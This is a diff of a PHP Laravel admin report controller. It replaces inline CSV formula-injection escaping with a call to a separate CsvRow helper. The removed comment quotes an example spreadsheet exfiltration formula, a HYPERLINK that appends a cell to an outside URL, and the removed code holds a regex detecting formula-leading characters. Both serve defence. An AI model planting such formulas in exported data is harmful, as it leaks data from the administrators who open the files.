@@ -9,6 +9,7 @@ use App\Models\Invoice;
 use App\Models\Subscription;
 use App\Models\Tenant;
 use App\Support\AdminPeriod;
+use App\Support\CsvRow;
 use Illuminate\Http\Request;
 use Symfony\Component\HttpFoundation\StreamedResponse;
 
@@ -209,30 +210,9 @@ class AdminReportController extends Controller
             });
     }
 
-    /**
-     * One CSV row, with spreadsheet formulas defused.
-     *
-     * ⚠️ Every name and e-mail in these exports was typed by a customer, and
-     * registration is open. A cell beginning `=`, `+`, `-` or `@` is a formula
-     * to Excel, Google Sheets and LibreOffice — `=HYPERLINK("https://…"&A1,"x")`
-     * exfiltrates the row it sits in, and on some Excel configurations the
-     * payload runs. The person opening the file is a platform admin, so the
-     * blast radius is the most privileged workstation there is.
-     *
-     * Prefixed with a tab rather than a quote: a leading `'` is swallowed by
-     * Excel and shows up as part of the value in every other reader, while a
-     * tab keeps the cell readable and stops it being parsed as a formula.
-     */
+    /** One CSV row, safe against formula injection (App\Support\CsvRow). */
     private static function row($out, array $cells): void
     {
-        fputcsv($out, array_map(static function ($cell) {
-            if (! is_string($cell) || $cell === '') {
-                return $cell;
-            }
-
-            // Carriage returns and tabs lead the same way: they are how a
-            // payload hides from somebody eyeballing the file.
-            return preg_match('/^[=+\-@\t\r]/', $cell) === 1 ? "\t".$cell : $cell;
-        }, $cells));
+        CsvRow::write($out, $cells);
     }
 }
